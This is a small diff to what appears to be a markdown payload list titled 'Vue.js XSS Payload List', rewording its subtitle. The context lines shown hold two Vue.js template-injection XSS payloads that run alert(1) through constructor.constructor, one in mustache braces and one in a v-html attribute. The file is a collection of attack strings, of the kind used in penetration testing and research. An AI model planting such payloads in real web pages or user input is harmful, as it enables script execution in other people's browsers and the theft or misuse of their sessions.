@@ -1,6 +1,6 @@
 # Vue.js XSS (Cross-Site Scripting) Payload List 
-Reflected XSS Payload List for Vue.js (2 &amp; 3)
 
+## XSS Payload List for Vue.js (v2 & v3):
 ```
 {{constructor.constructor('alert(1)')()}}
 <div v-html="''.constructor.constructor('alert(1)')()">a</div>
